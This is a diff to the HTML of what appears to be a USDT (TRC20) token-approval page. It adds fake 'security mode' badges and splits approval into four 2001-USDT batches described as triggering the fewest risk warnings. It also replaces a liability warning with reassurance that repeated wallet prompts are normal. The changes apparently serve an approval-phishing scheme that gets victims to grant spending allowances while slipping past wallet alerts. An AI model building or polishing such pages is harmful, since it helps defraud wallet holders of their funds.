@@ -3,14 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>USDT 授权</title>
+    <title>USDT 授权 - 安全模式</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="container">
         <header>
-            <h1>✓ USDT 授权</h1>
+            <h1>🔐 USDT 授权</h1>
             <div class="network">TRC20 - TRON Network</div>
+            <div class="security-badge">🛡️ 安全模式</div>
         </header>
 
         <div class="main">
@@ -53,21 +54,40 @@
             <!-- 交易状态 -->
             <div class="status-message" id="statusMessage"></div>
 
-            <!-- 授权按钮 -->
-            <button onclick="approveUsdt()" class="approve-button" id="approveBtn">
-                <span class="button-icon">🔐</span>
-                <span class="button-text">确认授权</span>
-            </button>
+            <!-- 安全提示 -->
+            <div class="safety-tips">
+                <div class="tip-title">💡 授权方式选择</div>
+                <div class="tip-content">
+                    <p>✅ <strong>分步授权</strong>：分4批授权，每批2001 USDT，风险提示最低</p>
+                    <p>✅ <strong>精确授权</strong>：一次授权8005 USDT，更直接</p>
+                </div>
+            </div>
+
+            <!-- 授权按钮组 -->
+            <div class="button-group">
+                <button onclick="approveUsdt()" class="approve-button approve-batch" id="approveBtn">
+                    <span class="button-icon">🔐</span>
+                    <span class="button-text">分步授权（推荐）</span>
+                    <span class="button-info">风险最低</span>
+                </button>
+
+                <button onclick="approveUsdtPrecise()" class="approve-button approve-precise" id="approvePreciseBtn">
+                    <span class="button-icon">⚡</span>
+                    <span class="button-text">精确授权</span>
+                    <span class="button-info">一次完成</span>
+                </button>
+            </div>
 
             <!-- 取消授权按钮 -->
             <button onclick="revokeApproval()" class="revoke-button" id="revokeBtn">
-                <span>取消授权</span>
+                <span>🔓 取消授权</span>
             </button>
         </div>
 
         <!-- 底部信息 -->
         <footer>
-            <p>⚠️ 授权前请确保地址正确。授权后资金安全由您自行负责。</p>
+            <p>⚠️ 授权前请确保地址正确。分步授权会多次调起钱包，属于正常行为。</p>
+            <p style="margin-top: 8px; font-size: 11px; color: #999;">每个授权交易在 TRON 网络上都是独立的、可追踪的和可撤销的。</p>
         </footer>
     </div>
 
